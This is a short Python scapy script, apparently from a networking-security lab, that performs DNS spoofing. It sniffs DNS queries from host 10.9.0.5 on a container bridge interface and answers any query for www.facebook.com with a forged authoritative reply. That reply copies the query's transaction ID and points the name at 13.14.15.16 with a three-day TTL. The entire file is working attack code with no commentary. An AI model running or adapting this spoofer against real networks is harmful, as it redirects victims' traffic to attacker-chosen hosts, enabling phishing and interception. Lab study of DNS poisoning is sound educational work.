#!/usr/bin/env python3
from scapy.all import *

IFACE = "br-8014da40d9cd"

SRC_HOST = "10.9.0.5"

FILTER = f"udp and src host {SRC_HOST} and dst port 53"

def spoofing_dns(pkt):
  if (DNS in pkt and 'www.facebook.com' in pkt[DNS].qd.qname.decode('utf-8')):
    i = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    u = UDP(dport=pkt[UDP].sport, sport=53)
    AnswerSec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='13.14.15.16')
    d = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0,arcount=0,
                 an=AnswerSec)
    spoof = i/u/d
    send(spoof)
pkt = sniff(iface = IFACE, filter=FILTER, prn=spoofing_dns)      
